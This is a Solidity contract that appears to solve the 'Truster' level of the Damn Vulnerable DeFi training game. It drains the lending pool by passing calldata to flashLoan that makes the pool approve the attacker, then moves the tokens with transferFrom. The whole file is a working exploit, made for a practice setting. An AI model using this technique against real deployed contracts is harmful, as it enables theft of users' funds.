// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

import "hardhat/console.sol";

interface ITrusterLenderPool {
    function token() external returns (DamnValuableToken);
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract TrusterLenderPoolAttack {
    ITrusterLenderPool private immutable victime;
    DamnValuableToken private immutable token;

    constructor(address _victime) {
        victime = ITrusterLenderPool(_victime);
        token = victime.token();
    }

    function _showMeTheMoney(address player, uint256 amount) private returns (bool) {
        return token.transferFrom(address(victime), player, amount);
    }

    function launchAttack(uint256 amount) external returns (bool) {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        victime.flashLoan(amount, address(victime), address(token), data);

        address player = msg.sender;
        return _showMeTheMoney(player, amount);
    }
}
